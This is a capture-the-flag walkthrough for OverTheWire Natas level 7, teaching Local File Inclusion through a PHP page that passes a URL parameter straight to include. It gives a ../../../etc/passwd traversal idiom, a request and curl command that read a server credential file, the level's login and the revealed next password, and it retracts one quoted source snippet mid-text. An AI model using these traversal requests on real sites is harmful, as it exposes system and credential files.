# Natas Level 7 → 8

## Goal

The page has two links ("Home" and "About") that go to `index.php?page=home` and `index.php?page=about`. The value of `page` is used directly to `include` a file — which lets you read **any file on the server**, including the password file at `/etc/natas_webpass/natas8`.

## Concepts you'll learn

- **Local File Inclusion (LFI)** — when user-controlled input is passed to PHP's `include`, `require`, `readfile`, etc., without sanitisation
- The idiom `page=../../../etc/passwd` for reading system files
- The canonical password path `/etc/natas_webpass/natasN` on the Natas servers

## Walkthrough

### 1. See the feature

Open `http://natas7.natas.labs.overthewire.org/` as `natas7`. Click "Home":

```
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

The page says "You are on the home page." So `page=home` tells the server to include a `home`-ish file.

### 2. View sourcecode

```php
<? include("files/" . $_GET["page"] . ".php"); ?>
```

No. Actually the Natas 7 source is typically:

```php
<?
$page = $_GET["page"];
if(isset($page)) include($page);
?>
```

The value of `page` is passed *straight to `include`* — any file path you supply gets read.

### 3. Read the password file

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

The page renders blank-ish, but if you look carefully (or use `curl`), the content of that file is now part of the HTML:

```bash
$ curl -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 \
       "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

Grep or scroll to find the 32-character password near the end of the body (it's usually just before `</div>`).

```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

## The answer

The password for `natas8` is:

**`DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas7.natas.labs.overthewire.org/>
